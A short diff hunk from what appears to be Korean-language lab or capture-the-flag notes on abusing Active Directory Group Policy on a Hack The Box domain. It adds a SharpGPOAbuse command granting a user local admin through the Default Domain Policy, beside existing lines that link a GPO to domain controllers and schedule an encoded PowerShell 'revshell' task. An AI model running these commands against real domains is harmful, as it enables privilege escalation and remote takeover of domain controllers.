@@ -992,6 +992,8 @@ New-GPO -name "0xdf"
 # DC의 Distinguished Name
 New-GPLink -Name "0xdf" -target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"
 
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
+
 .\SharpGPOAbuse.exe --addcomputertask --GPOName "ippsec" --Author "ippsec" --TaskName "revshell" --Command "powershell.exe" --Arguments "powershell -enc <base64>"
 
 gpupdate /force
